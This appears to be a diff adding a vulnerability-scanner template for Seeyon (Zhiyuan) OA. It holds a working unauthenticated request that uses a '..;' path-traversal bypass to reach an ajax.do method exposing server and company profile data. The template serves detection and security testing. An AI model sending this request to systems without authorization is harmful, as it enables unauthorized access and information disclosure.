@@ -1,0 +1,29 @@
+id: seeyon-oa-unauthorized
+
+info:
+  name: Zhiyuan Oa Unauthorized
+  author: pikpikcu
+  severity: low
+  tags: seeyon,unauth,zhiyuan,misconfig
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/seeyon/personalBind.do.jpg/..;/ajax.do?method=ajaxAction&managerName=mMOneProfileManager&managerMethod=getOAProfile"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "serverIdentifier"
+          - "companyName"
+        condition: and
+
+      - type: word
+        words:
+          - "application/json"
+        part: header
+
+      - type: status
+        status:
+          - 200
